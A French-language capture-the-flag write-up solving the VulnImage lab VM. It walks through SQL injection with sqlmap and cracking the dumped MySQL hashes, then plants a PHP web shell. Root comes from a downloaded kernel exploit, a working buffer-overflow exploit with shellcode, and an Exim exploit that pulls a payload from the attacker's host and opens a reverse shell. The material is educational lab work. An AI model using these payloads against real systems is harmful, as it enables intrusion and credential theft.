# Solution du CTF VulnImage

Insert coin
-----------

[VulnImage](http://vulnhub.com/entry/vulnimage-1,39/) est un CTF disponible sur *VulnHub* qui a été initialement créé en 2010. Ce CTF a été créé par les étudiants d'une université allemande.  

Comme souvent pas d'indication ni de scénario d'attaque fournit mais uniquement un objectif qui est ici de récupérer le magazine *Phrack* (malheureusement ce n'est pas le 69, vous vous-en doutez).  

Un petit scan nous renvoie beaucoup d'informations donc un service inconnu sur le port 7777 :  

```plain
Nmap scan report for 192.168.1.95
Host is up (0.000085s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 1024 8c:77:73:be:0d:a8:d5:7f:d8:b7:27:30:ed:52:85:23 (DSA)
|_2048 8b:df:2d:cd:cb:d1:5e:a8:8e:70:93:2d:a6:5f:f1:3c (RSA)
25/tcp   open  smtp        Exim smtpd 4.50
| smtp-commands: localhost.localdomain Hello nmap.scanme.org [192.168.1.3], SIZE 52428800, PIPELINING, HELP, 
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP 
80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
| mysql-info: Protocol: 10
| Version: 5.0.51a-24+lenny4
| Thread ID: 31
| Some Capabilities: Connect with DB, Compress, Transactions, Secure Connection
| Status: Autocommit
|_Salt: |%>H0U>rEAWrW>n1FM1K
7777/tcp open  cbt?
1 service unrecognized despite returning data.
SF-Port7777-TCP:V=6.40%I=7%D=4/13%Time=534AB355%P=x86_64-suse-linux-gnu%r(
SF:NULL,D,"HELO\nCOMMAND:")%r(X11Probe,14,"HELO\nCOMMAND:RECV:\x20l")%r(So
SF:cks5,15,"HELO\nCOMMAND:RECV:\x20\x05\x04")%r(Arucer,3E,"HELO\nCOMMAND:R
SF:ECV:\x20\xc2\xe5\xe5\xe5\x9e\xa0\xd7\xa4\xa6\xd0\xd5\xdd\xdc\xc8\xd6\xd
SF:d\xd7\xd5\xc8\xd1\xd6\x83\x80\xc8\xdd\xa4\xd1\xa1\xc8\xa4\xd2\xd5\xd7\x
SF:dd\xa3\xa4\xa1\xdd\xa6\xd7\xdd\x98\xe5")...;
MAC Address: 00:0C:29:B7:45:C6 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.5 - 2.6.12
Network Distance: 1 hop
Service Info: Host: localhost.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: DEBIAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery: 
|   OS: Unix (Samba 3.2.5)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2014-04-13T07:04:38+02:00
| smb-security-mode: 
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

Sur le port 80 utilisé par Apache on trouve une application de blog PHP-powered faite maison.  

On lance *Wapiti* dessus qui trouve immédiatement des failles SQL dans la page l'authentification et celle de modification du profil (toutes les pages en fait) :  

```plain
Injection MySQL dans http://192.168.1.95/admin/post.php via une injection dans le paramètre username
Evil request:
POST /admin/post.php HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/admin/post.php
Content-Type: application/x-www-form-urlencoded

month=on&date=13&year=on&username=%BF%27%22%28&password=letmein&time=07%3A08&title=default&entry=on&submit=Submit

Injection MySQL dans http://192.168.1.95/admin/post.php via une injection dans le paramètre password
Evil request:
POST /admin/post.php HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/admin/post.php
Content-Type: application/x-www-form-urlencoded

month=on&date=13&year=on&username=default&password=%BF%27%22%28&time=07%3A08&title=default&entry=on&submit=Submit

Injection MySQL dans http://192.168.1.95/admin/profile.php via une injection dans le paramètre username
Evil request:
POST /admin/profile.php HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/admin/profile.php
Content-Type: application/x-www-form-urlencoded

username=%BF%27%22%28&password=letmein&sig=on&fname=sig.txt&submit=Submit

Injection MySQL dans http://192.168.1.95/admin/profile.php via une injection dans le paramètre password
Evil request:
POST /admin/profile.php HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/admin/profile.php
Content-Type: application/x-www-form-urlencoded

username=default&password=%BF%27%22%28&sig=on&fname=sig.txt&submit=Submit
```

A noter qu'aucun mécanisme de cookies n'est présent c'est pour cela que les identifiants sont demandés sur les deux scripts.  

On remplit le formulaire en plaçant une parenthèse dans le champ du nom d'utilisateur comme *Wapiti* l'a fait et on obtient effectivement une erreur quelque peu bavarde :  

```plain
SELECT * FROM blog_users WHERE poster = 'test')' AND password = ''
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ')' AND password = ''' at line 1
```

On pourrait facilement exploiter cette faille à la main tellement l'erreur nous aide mais on va se servir de *sqlmap* pour gagner du temps. On commence par récupérer l'utilisateur courant avec cette commande :  

```plain
python sqlmap.py -u "http://192.168.1.95/admin/post.php" \
--data="month=on&date=13&year=on&username=*&password=letmein&time=07%3A08&title=default&entry=on&submit=Submit"\
--dbms=mysql --current-user
```

Le résultat s'affiche sous cette forme :  

```plain
[18:06:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 5.0 (lenny)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL 5.0
[18:06:50] [INFO] fetching current user
[18:06:50] [INFO] retrieved: root@localhost

current database:    'blogdb'
```

L'application web utilise l'utilisateur mysql root... ça envoie du lourd. On continue avec un dump des hashs (*--passwords*) :  

```plain
debian-sys-maint:5b745a5c3656f410
root@%:6ff1f95e508abd08
root:6ff1f95e508abd08
```

Ces derniers se cassent assez rapidement avec *JTR* :  

```plain
$ /opt/jtr/john   --format=mysql sqlmaphashes-2eH9R3.txt
Loaded 3 password hashes with no different salts (MySQL [32/64])
toorcon          (root@%)
toorcon          (root)
```

Après avoir identifié le nom de la base de données (*blogbd*) puis celui des tables (*-D blogbd--tables*) on dumpe le contenu de la table *blog\_users* contenant les infos de connexion de la webapp :  

```plain
+----+---------+-----------+
| id | poster  | password  |
+----+---------+-----------+
| 1  | blogger | blogger01 |
+----+---------+-----------+
```

Le script PHP */admin/profile.php* est particulièrement intéressant car on voit qu'il permet d'agir sur le système de fichier via les paramètres *sig* et *fname* envoyés via POST.  

Par défaut le champ fname (qui est caché) vaut *sig.txt*. Le champ sig est un textarea qui sera le contenu de la signature.  

Le fichier de signature est retrouvable dans */profiles/blogger-sig.txt*, il est donc calculé depuis le nom d'utilisateur et la valeur de *fname* avec un tiret entre les deux.  

Le script semble donc vulnérable à deux attaques. La première étant une lecture arbitraire des fichiers sur le disque.  

Deux méthodes d'injection pour accèder au contenu d'un fichier (comme */etc/passwd*) semblent possibles :  

* Définir le nom d'utilisateur à ../../../../../../etc/passwd terminé par un octet nul. Laisser *fname* vide. Pour cela le bypass SQL se fera via le champ de mot de passe (via saisie de *' union select 1,'',''#*
* Trouver un dossier existant sur le système qui comprends un tiret et mettre une partie dans le nom d'utilisateur, l'autre partie dans *fname*. La aussi l'injection SQL se fait via le mot de passe.

Malheureusement la première échoue, l'octet nul semble être retiré.  

La seconde méthode n'est pas plus couronnée de succès sans doute à cause d'un *open\_basedir* restrictif.  

Je vous laisse tout de même le script que j'ai écrit pour tester cette injection (qui utilise */etc/console-tools/* comme passage obligé) :  

```python
import requests
import sys

filename = sys.argv[1]

URL = "http://192.168.1.95/admin/profile.php"
data =  "username=../../../../../../../../../../../../../.."
data + "/etc/console&password=%27+union+select+1%2C%27%27%2C%27%27%23"
data += "&sig=&fname=tools/../..{0}&submit=Submit"
data = data.format(filename)
headers = {"Content-Type": "application/x-www-form-urlencoded"}

r = requests.post(URL, data=data, headers=headers)
print r.content
```

La seconde attaque est plus simple à mettre en oeuvre. Il suffit d'être en mesure de modifier dynamiquement la valeur du champ caché *fname* en passant par exemple l'extension de .txt à .php.  

Cela peut se faire via l'ancien *Opera (12.60)* ou les outils de développement intégrés à *Google Chrome* via l'onglet *Eléments* (clic-droit puis *Edit attribute* sur le champ souhaité).  

![Edit attribute - Google Chrome](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnimage_html.png)

Comme signature on mettra un code très classique :  

```plain
<?php system($_GET["cmd"]); ?>
```

On a maintenant notre première backdoor à cette adresse : */profiles/blogger-sig.php?cmd=commande*  

Ensuite on rapatrie une backdoor plus évoluée avec support du terminal.  

K is for Kernel, L is for Linux, O is for Old, P is for Pwnable
---------------------------------------------------------------

Tentons d'obtenir un accès root. Le kernel est ancien (2.6.8-2-386) donc ça devrait être aisé. On trouve [un exploit pour une faille dans sock\_sendpage](http://www.exploit-db.com/exploits/9479/) qui fait l'affaire :  

```plain
sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479
--08:41:48--  http://www.exploit-db.com/download/9479
           => `socksend.c'
Resolving www.exploit-db.com... 192.99.12.218, 198.58.102.135
Connecting to www.exploit-db.com[192.99.12.218]:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://www.exploit-db.com/download/9479/ [following]
--08:41:49--  http://www.exploit-db.com/download/9479/
           => `socksend.c'
Connecting to www.exploit-db.com[192.99.12.218]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3,509 [application/txt]

100%[==============================================================>] 3,509         --.--K/s             

08:41:49 (744.79 KB/s) - `socksend.c' saved [3509/3509]

sh-2.05b$ gcc -o socksend socksend.c 
sh-2.05b$ ./socksend 
Segmentation fault
sh-2.05b$ ./socksend 
[-] check ur uid
sh-2.05b$ id
uid=0(root) gid=0(root) groups=33(www-data)
sh-2.05b$ ls /root/
dbootstrap_settings  install-report.template  vuln-blog.tgz
sh-2.05b$ head /etc/shadow
root:$1$NTiT03rp$/kR5dsGRNA3UX7/6MbFEl/:14964:0:99999:7:::
daemon:*:14880:0:99999:7:::
bin:*:14880:0:99999:7:::
sys:*:14880:0:99999:7:::
sync:*:14880:0:99999:7:::
games:*:14880:0:99999:7:::
man:*:14880:0:99999:7:::
lp:*:14880:0:99999:7:::
mail:*:14880:0:99999:7:::
news:*:14880:0:99999:7:::
sh-2.05b# locate -i phrack
locate: /var/cache/locate/locatedb: No such file or directory
sh-2.05b# updatedb
sh-2.05b# locate -i phrack
/home/testuser/stuff/phrack67.tar.gz
```

Mission accomplie, on a notre trophée mais on n'a pas fait dans le fait maison.  

Old dog, Old tricks
-------------------

Voyons quel est le chemin officiel de terminer ce CTF.  

Dans les processus on trouve un exécutable nommé *buffd* qui tourne en tant que root et écoute sur le port 7777 vu en début d'article.  

```plain
root      3729  0.0  0.1  1556  504 ?        S    07:03   0:00 /usr/local/sbin/buffd
```

La commande *file* nous retourne les informations suivantes :  

```plain
buffd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.8, not stripped
```

On analyse le binaire avec radare2 (commandes *aa* puis *pdf@sym.main*) :  

```plain
|      |    ; CODE (CALL) XREF from 0x080487a4 (fcn.0804879a)
|      |    0x08048c95    e80afbffff   call sym.imp.accept
|      |       sym.imp.accept()
|      |    0x08048c9a    8945f0       mov [ebp-0x10], eax
|      |    0x08048c9d    837df0ff     cmp dword [ebp-0x10], 0xffffffff
| ========< 0x08048ca1    750e         jne 0x8048cb1
|      |    0x08048ca3    c70424bb8f0. mov dword [esp], str.accept ;  0x08048fbb 
|      |    0x08048caa    e8d5faffff   call sym.imp.perror
|      |       sym.imp.perror()
| ========< 0x08048caf    ebc0         jmp fcn.08048c71
| --------> 0x08048cb1    8d8548ffffff lea eax, [ebp-0xb8]
|      |    0x08048cb7    890424       mov [esp], eax
|      |    0x08048cba    e81afdffff   call sym.get_in_addr
|      |       sym.get_in_addr()
|      |    0x08048cbf    89c1         mov ecx, eax
|      |    0x08048cc1    0fb78548fff. movzx eax, word [ebp-0xb8]
|      |    0x08048cc8    0fb7d0       movzx edx, ax
|      |    0x08048ccb    c744240c2e0. mov dword [esp+0xc], 0x2e ;  0x0000002e 
|      |    0x08048cd3    8d855ef6ffff lea eax, [ebp-0x9a2]
|      |    0x08048cd9    89442408     mov [esp+0x8], eax
|      |    0x08048cdd    894c2404     mov [esp+0x4], ecx
|      |    0x08048ce1    891424       mov [esp], edx
|      |    0x08048ce4    e82bfaffff   call sym.imp.inet_ntop
|      |       sym.imp.inet_ntop()
|      |    0x08048ce9    8d855ef6ffff lea eax, [ebp-0x9a2]
|      |    0x08048cef    89442404     mov [esp+0x4], eax
|      |    0x08048cf3    c70424c48f0. mov dword [esp], str.server_gotconnectionfrom_s ;  0x08048fc4 
|      |    0x08048cfa    e825fbffff   call sym.imp.printf
|      |       sym.imp.printf()
|      |    0x08048cff    e8a0fbffff   call sym.imp.fork
|      |       sym.imp.fork()
|      |    0x08048d04    85c0         test eax, eax
| ========< 0x08048d06    0f853a010000 jne 0x8048e46
```

Du très classique avec un bind / listen / accept / fork... Voyons ce qu'on a plus loin.  

```plain
|      |    0x08048d61    c744240c000. mov dword [esp+0xc], 0x0
|      |    0x08048d69    89442408     mov [esp+0x8], eax
|      |    0x08048d6d    8d858cfeffff lea eax, [ebp-0x174]
|      |    0x08048d73    89442404     mov [esp+0x4], eax
|      |    0x08048d77    8b45f0       mov eax, [ebp-0x10]
|      |    0x08048d7a    890424       mov [esp], eax
|      |    ; CODE (CALL) XREF from 0x08048884 (fcn.0804887a)
|      |    0x08048d7d    e802fbffff   call sym.imp.send
|      |       sym.imp.send()
|      |    0x08048d82    83f8ff       cmp eax, 0xffffffff
| ========< 0x08048d85    750c         jne 0x8048d93
|      |    0x08048d87    c70424f28f0. mov dword [esp], str.send ;  0x08048ff2 
|      |    ; CODE (CALL) XREF from 0x08048784 (fcn.0804877a)
|      |    0x08048d8e    e8f1f9ffff   call sym.imp.perror
|      |       sym.imp.perror()
| --------> 0x08048d93    c744240c000. mov dword [esp+0xc], 0x0
|      |    0x08048d9b    c7442408000. mov dword [esp+0x8], 0x400 ;  0x00000400 
|      |    0x08048da3    8d858cf6ffff lea eax, [ebp-0x974]
|      |    0x08048da9    89442404     mov [esp+0x4], eax
|      |    0x08048dad    8b45f0       mov eax, [ebp-0x10]
|      |    0x08048db0    890424       mov [esp], eax
|      |    ; CODE (CALL) XREF from 0x08048744 (fcn.0804873a)
|      |    0x08048db3    e88cf9ffff   call sym.imp.recv
|      |       sym.imp.recv()
|      |    0x08048db8    85c0         test eax, eax
| ========< 0x08048dba    7473         je 0x8048e2f
|      |    0x08048dbc    8d858cf6ffff lea eax, [ebp-0x974]
|      |    0x08048dc2    890424       mov [esp], eax
|      |    0x08048dc5    e8cafbffff   call sym.vulnerable
```

Le programme envoie une chaîne au client, en reçoit une puis la passe à une fonction baptisée... *vulnerable* (le binaire n'est pas stripé).  

Mystère mystère, que peut donc bien faire cette fonction ?  

```plain
[0x080488e0]> pdf@sym.vulnerable
|          ; CODE (CALL) XREF from 0x08048dc5 (unk)
/ (fcn) sym.vulnerable 29
|          0x08048994    55           push ebp
|          0x08048995    89e5         mov ebp, esp
|          0x08048997    81ec88000000 sub esp, 0x88 ; 136 octets
|          0x0804899d    8b4508       mov eax, [ebp+0x8]
|          0x080489a0    89442404     mov [esp+0x4], eax
|          0x080489a4    8d4588       lea eax, [ebp-0x78]
|          0x080489a7    890424       mov [esp], eax
|          0x080489aa    e865feffff   call sym.imp.strcpy
|             sym.imp.strcpy(unk)
|          0x080489af    c9           leave
\          0x080489b0    c3           ret
```

Surprise ! Un classique buffer-overflow via l'utilisation de *strcpy*. Le buffer réservé sur la pile est de 136 octets.  

En plus l'ASRL n'est pas activé car les adresses des librairies sont les même d'une exécution à l'autre :  

```plain
sh-2.05b# ldd /bin/cat
        linux-gate.so.1 =>  (0xffffe000)
        libc.so.6 => /lib/libc.so.6 (0x40022000)
        /lib/ld-linux.so.2 (0x40000000)
sh-2.05b# ldd /bin/cat
        linux-gate.so.1 =>  (0xffffe000)
        libc.so.6 => /lib/libc.so.6 (0x40022000)
        /lib/ld-linux.so.2 (0x40000000)
```

Afin de tester l'exploitation de cette vulnérabilité on va récupérer l'exécutable sur notre système puis le soumettre à *gdb*.  

Comme le programme fork() à chaque client il est préférable de se connecter d'abord via *ncat* puis retrouver le pid du processus fils via *pstree -p* et enfin attacher le processus dans *gdb*.  

Comme le process se met en pause au rattachement on le remet en marche via *'c'* ou *'continue'* puis on envoie une chaîne de test (un max de A par exemple) :  

```plain
(gdb) attach 10340
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info regs
Undefined info command: "regs".  Try "help info".
(gdb) regs
Undefined command: "regs".  Try "help".
(gdb) info registers
eax            0xfffc0c90       -258928
ecx            0xfffc0e00       -258560
edx            0xfffc0d2c       -258772
ebx            0xf770d000       -143601664
esp            0xfffc0d10       0xfffc0d10
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x10202  [ IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

On a bien le contrôle sur EIP. Que se passe t-il si on varie un peu les caractères ?  

On envoie le résultat de la commande Python suivante :  

```python
print "A"*124 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4
```

Cette fois le résultat est particulièrement instructif :  

```plain
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers
eax            0xfffc0c90       -258928
ecx            0xfffc0df0       -258576
edx            0xfffc0d1c       -258788
ebx            0xf770d000       -143601664
esp            0xfffc0d10       0xfffc0d10
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x10202  [ IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) x/x $esp
0xfffc0d10:     0x43434343
(gdb) x/x $eax
0xfffc0c90:     0x41414141
```

On voit qu'il faut 124 caractères avant d'écraser l'adresse de retour. On remarque aussi que *eax* contient une adresse qui pointe idéalement vers le début de notre buffer :)  

On va donc chercher un gadget dans le binaire du type *jmp eax* ou *call eax* qui nous donnera un point de relais stable vers notre shellcode. *objdump* à la rescousse !  

```plain
objdump -d buffd | egrep '.*call.*eax$'
 804898f:       ff d0                   call   *%eax
 8048efb:       ff d0                   call   *%eax
```

Bingo !  

On écrit un petit exploit qui utilise un shellcode trouvé sur *shell-storm*. [Le shellcode utilisé ici](http://shell-storm.org/shellcode/files/shellcode-590.php) change simplement les droits sur */etc/shadow*.  

```python
import socket

shellcode =  "\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80"
addr = "\x8F\x89\x04\x08"
buff = "\x90" * (124 - len(shellcode))
buff += shellcode
buff += addr

s = socket.socket()
s.connect(('192.168.1.95', 7777))
s.recv(20)

s.send(buff)
s.recv(20)
s.close()
```

Qu'est-ce que ça donne ?  

```plain
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 719 2014-04-13 12:35 /etc/shadow
$ python sploit.py 
$ ls -l /etc/shadow
-rwxrwxrwx 1 root shadow 719 2014-04-13 12:35 /etc/shadow
```

Pwned again.  

Exim4, l'autre pays du pwnage
-----------------------------

Quels étaient les autres moyens d'arriver à ses fins ? Je n'ai trouvé rien d'intéressant via le Samba, en revanche [un exploit de KingCope pour Exim](http://www.exploit-db.com/exploits/15725/) permet d'obtenir un shell :  

```
> perl kingcope_exim.pl 192.168.1.95 http://192.168.1.3:8000/dc.pl 192.168.1.3 8888 
220 localhost.localdomain ESMTP Exim 4.50 Sun, 13 Apr 2014 17:58:03 +0200
250-localhost.localdomain Hello abcde.com [192.168.1.3]
250-SIZE 52428800
Set size to 52428800 !
250-PIPELINING
250 HELP
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
Sending large buffer, please wait...
552 Message size exceeds maximum permitted
250 OK
```

On aura préalablement mis en place un *SimpleHTTPServer* ainsi qu'un *ncat* :  

```plain
> ncat -l -p 8888 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 192.168.1.95.
Ncat: Connection from 192.168.1.95:38799.
id
uid=102(Debian-exim) gid=102(Debian-exim) groups=102(Debian-exim)
```

On ne tombe pas directement root mais ça évite toute la partie web...  

Game over

*Published April 15 2014 at 21:01*